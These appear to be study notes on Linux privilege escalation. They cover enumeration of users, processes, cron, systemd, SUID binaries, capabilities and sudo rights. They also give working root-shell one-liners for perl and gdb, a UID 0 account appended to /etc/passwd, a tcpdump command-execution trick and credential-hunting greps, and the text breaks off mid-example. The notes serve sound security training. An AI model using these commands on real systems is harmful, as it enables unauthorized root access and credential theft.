# Linux Privilege Escalation Overview


Linux Privilege Escalation Decision Tree
```
1. Current context
   ├── whoami
   ├── id
   ├── groups
   └── hostname

2. System context
   ├── uname -a
   ├── cat /etc/os-release
   ├── ip a
   ├── ip route
   └── ss -tulpn

3. Easy wins
   ├── sudo -l
   ├── env
   ├── /home user files
   └── credentials in configs/history

4. File permission issues
   ├── writable files
   ├── writable directories
   ├── writable /etc/passwd
   ├── writable cron scripts
   └── writable service files

5. Special execution paths
   ├── SUID
   ├── SGID
   ├── capabilities
   ├── sudo GTFOBins
   └── PATH hijacking

6. Scheduled or service execution
   ├── cron
   ├── systemd timers
   ├── root-run scripts
   └── custom daemons

7. Advanced / risky
   ├── NFS misconfiguration
   ├── mounted disks
   ├── kernel modules
   └── kernel exploits
```


## Manual Enumeration


| Category | Meaning          |                                                                     |
| -------- | ---------------- | ------------------------------------------------------------------- |
| owner    | the file owner   |                                                                     |
| group    | the owning group | define what the user can read, write, mount, administer, or access. |
| others   | everyone else    |                                                                     |

| Character | Meaning                               |
| --------- | ------------------------------------- |
| `r`       | read                                  |
| `w`       | write                                 |
| `x`       | execute                               |
| `s`       | SUID/SGID bit with execute present    |
| `S`       | SUID/SGID bit without execute present |


```bash
└─$ ls -l /etc/shadow                  
-rw-r----- 1 root shadow 1740 Feb 24 20:40 /etc/shadow

# root = owner & RW 
# group = shadow & R 
# other = no access
```


| Group                   | Use                                                                                                                                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `sudo`                  | Members may be able to run commands as root. Always check with `sudo -l` to see what is allowed.                                                                               |
| `adm`                   | Often allows reading system logs in `/var/log`. Logs may contain credentials, tokens, commands, paths, or service errors.                                                      |
| `docker`                | Docker access can often lead to root-equivalent control on the host if the user can start containers with mounted host paths.                                                  |
| `lxd`                   | LXD/LXC access may allow container-based privilege escalation if the user can create or run privileged containers.                                                             |
| `disk`                  | Can allow raw access to block devices. This may expose sensitive files such as `/etc/shadow` or application data.                                                              |
| `shadow`                | May allow reading `/etc/shadow`, which contains password hashes for local users.                                                                                               |
| `www-data`              | Indicates web server context. Useful for finding web roots, configs, database credentials, upload paths, and service permissions.                                              |
| Service-specific groups | Groups like `mysql`, `postgres`, `backup`, `docker`, `jenkins`, `git`, or `tomcat` may grant access to service files, configs, credentials, jobs, or writable execution paths. |


| Question                                                     | Commands                                                                                                                                                                                                                                                                                                           | What to fill in / look for                                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| User                                                         | `whoami`<br>`id`<br>`hostname`<br>`pwd`                                                                                                                                                                                                                                                                            | Current user, UID/GID, hostname, current working directory                                         |
| User perm                                                    | `sudo -l`<br>`sudo -V`<br>`ls -la`<br>`find / -type f -executable 2>/dev/null`                                                                                                                                                                                                                                     | Sudo rights, executable files, current directory permissions                                       |
| Groups                                                       | `id`<br>`groups`<br>`cat /etc/group \| grep username`                                                                                                                                                                                                                                                              | Interesting groups like `sudo`, `adm`, `docker`, `lxd`, `disk`, `shadow`, `www-data`               |
| Host vulnerabilities                                         | `uname -a`<br>`cat /etc/os-release`<br>`hostnamectl`<br>`ip a`<br>`ip route`<br>`ss -tulpn`<br>`ps auxww`                                                                                                                                                                                                          | Old kernel, unusual ports, internal-only services, strange processes, non-standard paths           |
| Credentials or secrets                                       | `ls -la /home`<br>`find /home -type f 2>/dev/null`<br>`find / -name "*pass*" 2>/dev/null`<br>`find / -name "*.txt" 2>/dev/null`<br>`grep -Ri "password\|passwd\|pwd\|secret\|key" /home 2>/dev/null`                                                                                                               | Passwords, SSH keys, config files, database creds, reused credentials                              |
| Writable files used by privileged processes                  | `find / -writable 2>/dev/null`<br>`find / -type f -writable 2>/dev/null`<br>`find / -type d -writable 2>/dev/null`<br>`ps auxww`<br>`ls -la /etc/cron*`                                                                                                                                                            | Writable scripts, configs, web roots, cron targets, service-related files                          |
| SUID, SGID, capability, sudo, cron, service, or kernel paths | **SUID:** `find / -perm -4000 2>/dev/null`<br>**SGID:** `find / -perm -2000 2>/dev/null`<br>**Capabilities:** `getcap -r / 2>/dev/null`<br>**Sudo:** `sudo -l`<br>**Cron:** `cat /etc/crontab; ls -la /etc/cron*`<br>**Services:** `systemctl list-units --type=service --state=running`<br>**Kernel:** `uname -a` | Compare findings with GTFOBins, writable paths, unusual custom binaries, old kernel versions       |
| Manually validated without breaking the system?              | `ls -l /path/to/file`<br>`stat /path/to/file`<br>`file /path/to/file`<br>`strings /path/to/file`<br>`/path/to/binary --help`                                                                                                                                                                                       | Confirm owner, permissions, file type, execution behavior, and whether the path is safely testable |

```bash
whoami  
id  
hostname  
uname -r  
arch

cat /etc/issue
cat /etc/os-release  
hostnamectl 2>/dev/null

sudo -l  # sudo permissions
echo $PATH  # suspicious or writable directories
env # useful environment variables

cat /etc/passwd # enumerate all users

su - root
sudo -i


uname -a
ss -tulpn
ps auxww
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
getcap -r / 2>/dev/null
find / -writable 2>/dev/null
```

```bash
# enumerate available binaries

ls /bin
ls /usr/bin
ls /usr/local/bin
```

```bash
# test common reverse shell options/ see path to interpreters

which bash
which sh
which nc
which python
which python3
which perl
which php
which ruby
which gcc
which curl
which wget
```


### Enumerate Local Users

| Field           | Example          | Meaning                              |
| --------------- | ---------------- | ------------------------------------ |
| login name      | `username`       | account name                         |
| password marker | `x`              | hash usually stored in `/etc/shadow` |
| UID             | `1000`           | user ID                              |
| GID             | `1000`           | primary group ID                     |
| comment         | `username,,,`    | user description field               |
| home directory  | `/home/username` | default home path                    |
| shell           | `/bin/bash`      | login shell                          |

```bash
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
alice:x:1000:1000:alice,,,:/home/alice:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
...
```

High-value:
- UID `0` = root-equivalent.
- UID `1000` + = normal users
-  `/usr/sbin/nologin` = Service account have shells like this
- normal users - home directories, history files, SSH keys, or configs.

### System and Kernel Information

```bash
hostname  # distribution
cat /etc/issue  # release
cat /etc/os-release  # codename
uname -a  #  kernel version
uname -r  # 
arch  # architecture
hostnamectl 2>/dev/null # kernel exploits (noisy, last resort)
```


### Process Enumeration

```bash
# list processes
ps aux

# filter for interesting root processes
ps aux | grep root
ps aux | grep -i pass
ps aux | grep -i backup
ps aux | grep -i cron

# watch for repeating processes
watch -n 1 "ps aux | grep -i pass"
```

Look for: 
- plaintext credentials in command arguments
- root-run scripts
- scheduled jobs
- backup tasks
- custom daemons
- local services
- misconfigured commands

e.g. 
```bash
ps aux
USER    PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND
...
root    4386  0.0  0.3  14940  8076 ?     Ss   18:08   0:00 sshd: alice [priv]
...
root    6051  0.0  0.0   2384   692 ?     S    18:22   0:00 sh -c sshpass -p 'bob_password' ssh  -t bob
```


### Network Context

#### Interfaces

```bash
ip a
ifconfig 2>/dev/null
```

#### Routes

```bash
ip route  
routel 2>/dev/null  
route -n 2>/dev/null
```

#### Listening ports and active connections

```bash
ss -anp
ss -tulpn
ss -tulpn | grep LISTEN
```

| Flag | Meaning              |
| ---- | -------------------- |
| `-a` | all sockets          |
| `-n` | do not resolve names |
| `-p` | show process         |
| `-t` | TCP                  |
| `-u` | UDP                  |
| `-l` | listening sockets    |

look for:
- local-only services on `127.0.0.1`
- unexpected root-owned services
- ports not visible from external enumeration
- internal services useful for port forwarding


### Firewall and Filtering Clues

find firewall {state, profile, rules} 
- info on inbound/outbound port filtering for port forwarding/tunneling
				-> useful for pivoting to internal network 
- reveals
	- allowed inbound ports  
	- blocked inbound or outbound traffic  
	- internal-only services  
	- forwarding restrictions  
	- services worth checking from the compromised host

e.g. important info
	- a port may be open only to `127.0.0.1`  
	- a service may be reachable only from an internal subnet  
	- outbound traffic may be restricted  
	- forwarding rules may allow or block pivoting paths  
	- firewall config files may reveal non-obvious allowed ports

#### `ss` : Check active listening services

display active network connection and listening ports 
```bash
ss -tulpn | grep LISTEN
```

e.g. 
```bash
ss -tulpn | grep LISTEN

127.0.0.1 # local-only access
0.0.0.0 # all interfaces
internal_ip # service only reachable from the internal network
```

#### `iptables`: Check readable iptables configuration files

`iptables` 
- generally requires root privilege, but other related files depend on configurations 
- weak file permissions may allow local users to read firewall policy

`iptables-persistent`
- saves firewall rules in `/etc/iptables` by default 
- files  are used by system to restore `netfilter` rules at boot time 

Check readable firewall config
```bash
ls -la /etc/iptables 2>/dev/null

# rules.v4 contains saved IPv4 firewall rules
cat /etc/iptables/rules.v4 2>/dev/null

# rules.v6 contains saved IPv6 firewall rules
cat /etc/iptables/rules.v6 2>/dev/null
```


Search for firewall-related references
- If the firewall rules are not stored in `/etc/iptables/`
	-  search config directories for references to `iptables`, `iptables-save`, or `iptables-restore`
	- if insecure perm -> use contents of the references to infer firewall config rules
```bash
grep -Ri "iptables" /etc 2>/dev/null

# dumps firewall config and rules to a file 
grep -Ri "iptables-save" /etc 2>/dev/null

# loads saved rules often at boot
grep -Ri "iptables-restore" /etc 2>/dev/null

#  reveal destination-port filtering rules
grep -Ri "dport" /etc 2>/dev/null
```

```bash
# shows active rules in table format
iptables -L -n -v 

# shows active rules in command syntax
iptables -S

# outputs rules in a restorable format
iptables-save
```

Look for: 
- allowed internal ports
- blocked inbound/outbound traffic
- port forwarding constraints
- services worth checking locally

e.g.
```bash
cat /etc/iptables/rules.v4

# Generated by xtables-save v1.8.2 on DATE
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT
COMMIT
# Completed on DATE
```
- R (users besides root) :D 
- non default rule 
	- `-A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT` 
				-> explicitly allowing inbound TCP traffic to port 8080

| Finding         | Use                                                                         |
| --------------- | --------------------------------------------------------------------------- |
| `--dport port`  | Destination port rule; tells you which inbound ports are allowed or blocked |
| `--sport port`  | Source port rule; less common, but can affect traffic matching              |
| `-j ACCEPT`     | Traffic matching the rule is allowed                                        |
| `-j DROP`       | Traffic matching the rule is silently dropped                               |
| `-j REJECT`     | Traffic matching the rule is blocked with a rejection response              |
| `INPUT`         | Traffic coming into the host                                                |
| `OUTPUT`        | Traffic leaving the host                                                    |
| `FORWARD`       | Traffic routed through the host; important for pivoting                     |
| `127.0.0.1`     | Local-only access; may require local port forwarding                        |
| Internal subnet | May reveal reachable networks for pivoting                                  |

Debugging / Troubleshooting
- assuming a closed port from Kali means the service is not running
- not checking services bound to `127.0.0.1`
- forgetting that firewall rules can differ for inbound, outbound, and forwarded traffic
- ignoring `/etc/iptables/rules.v4` because active `iptables` needs root
- treating one allowed port as proof that all traffic is allowed
- forgetting IPv6 rules may exist separately in `rules.v6`


### Sudo Privileges

```bash
sudo -l
which binary_name  
ls -l /path/to/binary
```

Look for: 
- Can the user run anything as root?
- Is `NOPASSWD` present?
- Are wildcards used?
- Are arguments restricted?
- Does the allowed binary have a GTFOBins entry?
- Is AppArmor, SELinux, or another MAC system blocking abuse?

```bash
# e.g
sudo -l 

User username may run the following commands on hostname:  
(root) NOPASSWD: /usr/bin/vim
```

### AppArmor, SELinux, and MAC Controls

AppArmor = - kernel module providing mandatory access control (MAC) 
- enabled by default on deb 10  
- status : root/lab user using aa-status  
- cause sudo or binary abuse paths to fail (e.g. GTFOBins exploits)

AppArmor checks
```bash
aa-status 2>/dev/null
cat /var/log/syslog | grep -i apparmor 2>/dev/null
dmesg | grep -i apparmor 2>/dev/null
```

SELinux checks
```bash
getenforce 2>/dev/null  
sestatus 2>/dev/null
```

```bash
# e.g.
aa-status  

apparmor module is loaded.  
20 profiles are loaded.  
18 profiles are in enforce mode.  
   /usr/bin/evince  
   /usr/bin/evince-previewer  
...
...  
2 profiles are in complain mode.  
...
3 processes have profiles defined.  
3 processes are in enforce mode.  
...
0 processes are in complain mode.  
0 processes are unconfined but have a profile defined.  
```


### Environment and PATH

```bash
# inspect enviornment
env  
echo $PATH

# check how binaries resolve
which tar  
type tar  
whereis tar
```
- credentials in environment variables
- custom variables used by scripts
- writable directories in `$PATH`
- unusual path order
- scripts that call commands without absolute paths

If a privileged script calls `tar`, `cp`, `find`, or another binary without an absolute path 
		-> a writable `$PATH` or writable working directory may become useful.


### Writable Files and Directories

```bash
# Writable directories
find / -writable -type d 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null
```

High-value:
- `/etc/passwd`
- scripts executed by root
- cron scripts
- service files
- files under `/opt`
- files under `/srv`
- files under `/var/www`
- backup scripts
- directories used by root-owned jobs

Common noise
- `/tmp`
- `/var/tmp`
- `/dev/shm`
- the current user's home directory

Common mistake
- Writable is only interesting when something privileged reads, executes, or trusts it.


### Interesting Files and Directories

Common locations for custom applications, scripts, configs, and backups
```bash
ls -la /opt
ls -la /srv
ls -la /var/www
ls -la /home
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm
```

Find Documents and configs
```bash
find / -name "*.txt" 2>/dev/null
find / -name "*.pdf" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*.sh" 2>/dev/null
```

Find modified files
```bash
find / -type f -mtime -7 2>/dev/null
```

User Trails and Credentials
```bash
# Home directory checks
ls -la /home
ls -la /home/username
ls -la /home/username/.ssh

# History and shell files
cat /home/username/.bash_history 2>/dev/null
cat /home/username/.zsh_history 2>/dev/null
cat /home/username/.profile 2>/dev/null
cat /home/username/.bashrc 2>/dev/null
cat /home/username/.bash_logout 2>/dev/null

# Search for credential words
grep -Ri "password" /home 2>/dev/null
grep -Ri "passwd" /home 2>/dev/null
grep -Ri "pwd" /home 2>/dev/null
grep -Ri "secret" /home 2>/dev/null
grep -Ri "token" /home 2>/dev/null
grep -Ri "key" /home 2>/dev/null

# SSH Keys
find /home -name "id_rsa" 2>/dev/null
find /home -name "id_dsa" 2>/dev/null
find /home -name "authorized_keys" 2>/dev/null
find /home -name "known_hosts" 2>/dev/null
```

- `su` to another user
- SSH as another user
- sudo with a discovered password
- database access
- web application admin access
- lateral movement


### Service Footprints

Inspect root-owned services/processes
```bash
ps aux | grep root
ps aux | grep -i service
ps aux | grep -i backup
ps aux | grep -i pass
```

Look for credentials in process arguments
```bash
ps auxww | grep -i pass
ps auxww | grep -i user
```

Packet capture note
- Raw packet capture usually requires elevated privileges or specific sudo rights
```bash
sudo tcpdump -i lo -A
```

Look for: 
- local service credentials 
- plaintext communication

common mistake
- assume `tcpdump` possible as normal user
	- check `sudo -l` first

### Scheduled Tasks

Scheduled Tasks = periodically executed automated tasks
- systems acting as servers execute tasks 
- may execute scripts or binaries automatically, sometimes as `root`
- if system runs a file you can modify, or processes files from a directory you can write to -> privesc

`cron` = linux job scheduler 
- scheduled tasks list $\in$ `/etc/cron.x`.
- `.x` = tells at which frequency tasks run 
- custom jobs are often added by admins or applications
- root-owned scheduled tasks are especially important to inspect

| Location             | Purpose                                                              |
| -------------------- | -------------------------------------------------------------------- |
| `/etc/crontab`       | System-wide cron file; often includes the user that each job runs as |
| `/etc/cron.d/`       | Additional system cron jobs                                          |
| `/etc/cron.hourly/`  | Scripts that may run hourly                                          |
| `/etc/cron.daily/`   | Scripts that may run daily                                           |
| `/etc/cron.weekly/`  | Scripts that may run weekly                                          |
| `/etc/cron.monthly/` | Scripts that may run monthly                                         |
| User crontabs        | Per-user scheduled jobs                                              |

| Finding                           | Why it matters                                                                        |
| --------------------------------- | ------------------------------------------------------------------------------------- |
| Script run by `root`              | High-value target if any part is writable or controllable                             |
| Writable script                   | If a privileged cron job runs it, modifying it may lead to privilege escalation       |
| Script in user-writable directory | Directory-level write access may allow replacement or path abuse                      |
| World-writable file or directory  | May allow low-privileged users to alter privileged execution flow                     |
| Relative paths                    | Cron jobs using commands without absolute paths may be vulnerable to PATH issues      |
| Input files you control           | A root script processing user-controlled input may be abused                          |
| Jobs running every minute         | Easier and faster to test safely                                                      |
| Backup or cleanup scripts         | Often process files automatically and may contain weak assumptions                    |
| Custom admin scripts              | More likely to contain insecure permissions or unsafe logic than standard system jobs |

#### Cron Jobs

Check cron locations
```bash
cat /etc/crontab
ls -lah /etc/cron*
ls -lah /etc/cron.d/
ls -lah /etc/cron.hourly/
ls -lah /etc/cron.daily/
ls -lah /etc/cron.weekly/
ls -lah /etc/cron.monthly/
```

Check current user's cron jobs
```bash
crontab -l

# Check root cron if sudo allows it
sudo crontab -l
```

Check cron logs
```bash
# Debian/Ubuntu commonly log cron activity in syslog
grep "CRON" /var/log/syslog 2>/dev/null

# Some systems may use a dedicated cron log:
cat /var/log/cron.log 2>/dev/null  
grep "CRON" /var/log/cron 2>/dev/null
```

Look for: 
- scripts run by root
- scripts located in user-writable directories
- world-writable scripts
- scripts using relative paths
- scripts processing files you control
- jobs running every minute

Inspect a suspicious cron script
```bash
ls -lah /path/to/script.sh  
cat /path/to/script.sh
```
confirm: 
- who runs it
- how often it runs
- whether you can modify the script
- whether you can modify input files or directories used by the script
- whether output is logged somewhere useful

e.g
```bash
ls -lah /etc/cron*

-rw-r--r-- 1 root root 1.1K Oct 11 2019 /etc/crontab  
  
/etc/cron.d:  
total 20K  
drwxr-xr-x 2 root root 4.0K May 1 10:00 .  
drwxr-xr-x 95 root root 4.0K May 1 10:00 ..  
-rw-r--r-- 1 root root 201 May 1 10:00 backup  
  
/etc/cron.daily:  
total 32K  
drwxr-xr-x 2 root root 4.0K May 1 10:00 .  
drwxr-xr-x 95 root root 4.0K May 1 10:00 ..  
-rwxr-xr-x 1 root root 376 May 1 10:00 logrotate  
  
/etc/cron.hourly:  
total 8.0K  
drwxr-xr-x 2 root root 4.0K May 1 10:00 .  
drwxr-xr-x 95 root root 4.0K May 1 10:00 ..

cat /etc/cron.d/backup  
ls -lah /etc/cron.d/backup
```

- `/etc/crontab` exists and may define system jobs
- `/etc/cron.d/backup` is a custom-looking cron file worth inspecting
- standard cron directories exist
- files owned by `root` are not automatically vulnerable, but should be checked for insecure permissions or unsafe logic


#### Systemd Timers and Services

```bash
systemctl list-timers 2>/dev/null
systemctl list-units --type=service 2>/dev/null

# Check common service locations:
ls -la /etc/systemd/system/
ls -la /lib/systemd/system/
```

Inspect a service
```bash
systemctl cat service_name 2>/dev/null
cat /etc/systemd/system/service_name.service 2>/dev/null
```

Look for:
- writable service files
- writable executed scripts
- `ExecStart` paths
- services running as root
- unusual custom services
- insecure working directories

Inspect a service
```bash
systemctl cat service_name 2>/dev/null
cat /etc/systemd/system/service_name.service 2>/dev/null
cat /lib/systemd/system/service_name.service 2>/dev/null
```
Look for:
- `User=`
- `Group=`
- `ExecStart=`
- `ExecStartPre=`
- `ExecStartPost=`
- `WorkingDirectory=`
- `Environment=`
- `EnvironmentFile=`
Why:
- missing `User=` often means the service runs as `root`
- `ExecStart=` shows the executed binary or script
- writable executed scripts may be privilege escalation paths
- writable working directories may allow file planting or path abuse
- environment files may contain credentials


| Finding                     | Use                                                                    |
| --------------------------- | ---------------------------------------------------------------------- |
| Service running as `root`   | High-value if its executed file or config is writable                  |
| Writable service file       | May allow changing how the service starts if you can reload/restart it |
| Writable `ExecStart` target | A privileged service may execute a file you can modify                 |
| Writable `WorkingDirectory` | May allow dependency, config, or relative path abuse                   |
| Custom service              | More likely to be misconfigured than default system services           |
| Environment files           | May contain secrets or point to writable configs                       |
| Timer-triggered service     | Automated execution path similar to cron                               |

Common mistakes
- only checking cron and forgetting systemd timers
- assuming a root-owned cron job is exploitable without checking write access
- ignoring directories that contain scripts, not just the scripts themselves
- missing relative paths inside scripts
- not checking whether the job actually runs
- modifying files before manually validating ownership, permissions, and execution context
- forgetting to inspect custom files in `/etc/cron.d/` and `/etc/systemd/system/`

### Installed Packages

Installed software can reveal vulnerable versions and service roles.

Debian/Ubuntu
```
dpkg -l
dpkg -l | grep -i apache
dpkg -l | grep -i mysql
dpkg -l | grep -i nginx
```

RHEL/CentOS/Fedora
```bash
rpm -qa
rpm -qa | grep -i httpd
rpm -qa | grep -i mysql
```

Packages 
- show system is meant to do
- may reveal vulnerable local software or misconfigured services.

### Mounted Filesystems and Disks

Mounted filesystems
```bash
mount
df -h
cat /etc/fstab
```

Block devices
```bash
lsblk
blkid 2>/dev/null
```

look for
- unmounted partitions
- writable mounts
- unusual mount points
- `noexec`, `nosuid`, or missing hardening options
- NFS mounts
- backup disks

Common mistake
- Do not only inspect `/`. 
- Extra disks and mounts can contain backups, keys, or scripts.

### NFS checks

```bash
cat /etc/exports 2>/dev/null
mount | grep nfs
cat /etc/fstab | grep nfs
```

Misconfigured exports, especially writable exports with `no_root_squash`, can lead to privilege escalation.

### Kernel Modules and Drivers

help identify virtualization, driver exposure, and potential kernel attack surface

List loaded modules
```bash
lsmod
```

Inspect module details
```bash
/sbin/modinfo module_name
```

e.g
```bash
/sbin/modinfo libata
```

Kernel modules and drivers may be relevant for kernel exploits, device access, or unusual system behavior.

### SUID and SGID Binaries

Executable file permission
- **SUID** (Set User ID) allows an executable to run with the permissions of the **file owner**  
- **SGID** (Set Group ID)allows an executable to run with the permissions of the **file group**
- Normally, when a user runs a program, the program inherits user's permissions.

| Field                            | Meaning                                            |
| -------------------------------- | -------------------------------------------------- |
| Real UID                         | The actual user who launched the process           |
| Effective UID / GID (eUID, eGID) | The UID used for permission checks                 |
| Saved Set UID                    | Allows switching back to a previous privileged UID |
| Filesystem UID                   | Used for filesystem permission checks              |

Attack vector = If the effective UID is 0, the process has root-level effective permission
	-> exploit for privilege escalation 

SUID/SGID -marked binaries 
- `-type f`: search for files 
- `-perm -u=s`: `SUID` bit set     |     `-perm -g=s`: `SGID` bit set
- `2>/dev/null`: discard all err messages

Find SUID binaries 
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# equivalent numeric form
find / -perm -4000 -type f 2>/dev/null
```

Find SGID Binaries
```bash
# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null

# equivalent numeric form
find / -perm -2000 -type f 2>/dev/null
```

inspect interesting binary
```bash
# Shows permissions, owner, group, and SUID/SGID bits
ls -l /path/to/binary

# Shows numeric permissions and detailed metadata
stat /path/to/binary

# Shows whether it is an ELF binary, script, or other file type
file /path/to/binary

# May reveal hardcoded paths, commands, credentials, or unsafe logic
strings /path/to/binary | head

# May reveal intended usage without modifying the system
--help
```

high value
- custom SUID binaries
- SUID binaries in unusual locations
- binaries in `/usr/local/bin`, `/opt`, `/tmp`, or home directories
- binaries owned by `root` and executable by other users
- known GTFOBins entries
- binaries calling other commands without absolute paths
- scripts or binaries using relative paths
- binaries processing files you control
- old or vulnerable SUID binaries such as `pkexec`

e.g.
```bash
# Find writable files and directories
find / -perm -u=s -type f 2>/dev/null

/usr/bin/find
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd_flag
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd

# Inspect binary
ls -l /usr/local/bin/backup

-rwsr-xr-x 1 root root 16720 Apr 19 14:20 /usr/local/bin/backup
# root root = root owns file and group
# s in rws = SUID set, owner execute is present
# if exploitable, may run with root effective privileges


# further inspection
file /path/to/binary
strings /path/to/binary | less
/path/to/binary --help 2>/dev/null
```

#### Effective UID and SUID Behavior

SUID binary 
- may run with different effective UID instead of user's UID

```bash
# inspect process UID
ps aux | grep passwd

# inspect UID fields
grep Uid /proc/pid/status

Uid:    1000    0       0       0
# Real UID | Effective UID | Saved Set UID | Filesystem UID
```

if effective UID = 0 -> process has root-level effective permissions even if launch by normal user

### Linux Capabilities



Capabilities
- extra attributes assigned to processes, binaries, services  
- used to assign specific privileges usually reserved for admin operations (e.g. traffic capturing / adding kernel modules)  
- if misconfigured -> capabilities can be exploited to escalate to root. 
- Capabilities can grant privileged actions without full root or SUID.
  
```bash
# Enumerate capabilities
# using `-r` for recursive search start @ root folder "/"  
getcap -r / 2>/dev/null

# If getcap is not in PATH:
/usr/sbin/getcap -r / 2>/dev/null
```

| Flag | Meaning     |
| ---- | ----------- |
| `e`  | Effective   |
| `p`  | Permitted   |
| `i`  | Inheritable |

| Capability            | Use                                                    |
| --------------------- | ------------------------------------------------------ |
| `cap_setuid`          | May allow setting UID to root                          |
| `cap_setgid`          | May allow setting GID to privileged groups             |
| `cap_dac_read_search` | May allow reading files bypassing normal permissions   |
| `cap_dac_override`    | May bypass file read/write permission checks           |
| `cap_net_admin`       | May allow network configuration changes                |
| `cap_sys_admin`       | Very broad; often considered close to root-level power |
| `cap_sys_ptrace`      | May allow process inspection or manipulation           |
| `cap_chown`           | May allow changing file ownership                      |

e.g.
```bash
/usr/sbin/getcap -r / 2>/dev/null

/usr/bin/ping = cap_net_raw+ep  
/usr/bin/perl = cap_setuid+ep  
/usr/bin/perl5.28.1 = cap_setuid+ep  
/usr/bin/gdb = cap_setuid+ep
```

- `ping` has `cap_net_raw`, which is normal for raw network packets
- `perl` has `cap_setuid`, which is high-value and unusual
- `gdb` has `cap_setuid`, which is high-value and unusual
- `+ep` means the capability is effective and permitted


search [_GTFOBins_](https://gtfobins.github.io/) = containing a list of UNIX binaries & exploits for privilege escalation
  
search "perl" on GTFOBins -> find instructions + command 
https://gtfobins.org/gtfobins/perl/
```bash
# execute shell + POSIX directives enabling setuid  
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' 

# id
uid=0(root) gid=1000(alice) groups=1000(alice) 
```  

https://gtfobins.github.io/gtfobins/gdb/
```bash
# runs local copy of gdb 
# note: **setup step** for demonstration, not something a low-privileged user can normally do.
cp $(which gdb) .
sudo setcap cap_setuid+ep gdb

# exploit from gtfo
./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit

GNU gdb (Debian 8.2.1-2+b3) 8.2.1
# id
uid=0(root) gid=1000(alice) groups=1000(alice)

```


### Abusing Writable `/etc/passwd`

```bash
# check perm
ls -l /etc/passwd

# check if writable 
# If `/etc/passwd` is writable, an attacker may be able to add or modify a UID `0` account.
find / -writable -type f 2>/dev/null | grep "/etc/passwd"
```

e.g.
```bash
openssl passwd password

echo 'root2:generated_hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```

Note: Do not edit `/etc/passwd` unless you know it is writable and you are in an authorized lab. A bad edit can break authentication.

### Sudo Abuse

Attack vector: 
permissive `/etc/sudoers`
	-> user can run specific command(s) as root  
	-> if command has escape / write / execute primitive  
	-> possible root shell / root file write / persistence path
	  
Sudo abuse workflow:
```text
1. identify exact allowed command  
2. check if arguments are restricted  
3. check GTFOBins  
4. check if binary can:  
		- spawn shell  
		- execute command  
		- write file  
		- read file  
		- load plugin / script  
		- call external command  
5. test safely  
6. if blocked -> check AppArmor / SELinux / logs
```

```bash
# check sudo 
sudo -l  

# interesting sudo settings
# NOPASSWD -> run allowed command without password  
# SETENV -> may allow env var abuse  
# NOEXEC -> may block shell escapes  
# secure_path -> controls PATH used by sudo command
ls -l /usr/sbin/tcpdump  
ls -l /usr/bin/apt-get  
which tcpdump  
which apt-get

ls -l /path/to/allowed_binary
/path/to/allowed_binary --help 2>/dev/null  
cat /var/log/syslog 2>/dev/null | grep -i "apparmor\|denied\|sudo"
```

```text
Command abuse patterns
sudo allowed binary  
	-> shell escape  
	-> root shell  
  
sudo allowed editor  
	-> edit /etc/sudoers / root-owned file  
  
sudo allowed file reader  
	-> read /etc/shadow / root SSH keys / configs  
  
sudo allowed package manager  
	-> pager escape / script hook / plugin path  
	  
sudo allowed service command  
	-> restart service that uses writable file  
  
sudo allowed backup/compress tool  
	-> read/write arbitrary files  
  
sudo allowed scripting language  
	-> spawn shell / setuid / command exec
```

| Check for sudo command       | Why                                                       |
| ---------------------------- | --------------------------------------------------------- |
| exact binary path            | sudoers may allow `/usr/bin/apt-get` but not another copy |
| allowed arguments            | sudoers may restrict safe subcommands only                |
| `NOPASSWD`                   | no password needed -> faster path                         |
| GTFOBins entry               | known shell / file read / file write primitives           |
| AppArmor / SELinux           | may block GTFOBins technique                              |
| writable config/plugin paths | sudo binary may load files you control                    |
| environment restrictions     | `env_reset`, `secure_path`, blocked env vars              |
| command output               | may leak files, creds, logs, configs                      |

e.g `sudo tcpdump`
```bash
# check sudo 
sudo -l  

User username may run the following commands on hostname:
    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

username can run specific binaries as root  
-> not full sudo  
-> but each allowed binary must be checked individually

https://gtfobins.org/gtfobins/tcpdump/
```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root
```

edit for convenience 
```bash
# -> command you want tcpdump to execute
COMMAND='id' 
# -> creates a temporary file path
TF=$(mktemp)
# -> makes the temp file executabl
echo "$COMMAND" > $TF
